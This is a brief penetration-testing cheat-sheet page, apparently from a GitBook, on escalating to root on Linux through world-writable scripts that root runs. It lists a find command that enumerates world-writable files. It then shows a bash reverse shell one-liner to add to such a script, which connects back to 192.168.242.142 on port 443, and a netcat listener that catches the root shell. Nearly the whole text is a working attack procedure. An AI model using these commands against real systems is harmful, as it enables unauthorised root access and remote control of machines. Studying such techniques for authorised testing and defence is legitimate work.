# Writeable scripts - run by root

#### Enumerate over-permissive scripts.

```bash
find / -perm -2 ! -type l -ls 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (92).png" alt=""><figcaption></figcaption></figure>

#### Edit the script - include the following command.&#x20;

```bash
bash -c 'bash -i >& /dev/tcp/192.168.242.142/443 0>&1' 
```

Establish the netcat listener and wait for a root to execute the script

```bash
nc -nlvp 443
```

<figure><img src="../../.gitbook/assets/image (93).png" alt=""><figcaption></figcaption></figure>
